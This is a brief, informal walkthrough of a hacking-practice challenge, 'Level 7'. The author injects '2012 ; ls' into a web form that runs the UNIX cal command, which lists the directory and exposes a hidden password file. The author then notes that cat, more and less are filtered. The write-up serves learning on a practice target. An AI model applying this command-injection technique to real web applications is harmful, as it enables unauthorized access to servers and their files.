So the first 6 levels were pretty easy no need for writeup now starting from this level it starts to get complex so the challege ask
to input a year and it shows the calendar for it now we need to get the password 

```html
<center>
<br><center><b>Level 7</b></center><br><br>This time Network Security sam has saved the unencrypted level7 password in an obscurely named file saved in this very directory.<br><br>In other unrelated news, Sam has set up a script that returns the output from the UNIX cal command. Here is the script:<br><br>Enter the year you wish to view and hit 'view'.<br>
                        <form action="/missions/basic/7/cal.pl" method="post">
                        <input name="cal" type="text">
                        <input value="view" type="submit">
                        </form>
                        <br><br><center><b>Password:</b><br>
			<form action="/missions/basic/7/index.php" method="post">
			<input name="password" type="password"><br><br>
			<input value="submit" type="submit"></form>
</center></center>
```
Now when it typed 
```shell
2012 ; ls
```
I made the calendar list all the files after showing the calendar for **2012** 
```text
<-----------Snipp---------->
       December 2012
Mon Tue Wed Thu Fri Sat Sun
                      1   2
  3   4   5   6   7   8   9
 10  11  12  13  14  15  16
 17  18  19  20  21  22  23
 24  25  26  27  28  29  30
 31


.
..

cal.pl
index.php
k1kh31b1n55h.php
level7.php
```
The Problem is **cat,more,less** are filtered so we can't read the file for password but we can call the file in the URL :-D 
we can access the password 

